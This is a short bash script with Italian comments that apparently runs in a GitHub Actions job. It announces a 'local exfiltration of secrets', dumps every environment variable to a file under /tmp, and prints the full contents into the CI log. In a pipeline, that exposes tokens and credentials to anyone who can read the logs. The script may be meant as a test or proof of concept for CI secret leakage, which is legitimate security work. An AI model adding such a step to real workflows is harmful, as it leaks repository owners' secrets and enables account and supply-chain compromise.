#!/bin/bash

echo "[*] Avvio esfiltrazione locale dei secrets..."

# Crea una directory temporanea
mkdir -p /tmp/secrets-test

# Scrive tutte le variabili di ambiente nel file dump
env | tee /tmp/secrets-test/dump.txt

echo "[*] Dump completato. Contenuto salvato in /tmp/secrets-test/dump.txt"

# Mostra il contenuto del dump direttamente nel log GitHub Actions
echo ""
echo "[*] Contenuto del dump:"
cat /tmp/secrets-test/dump.txt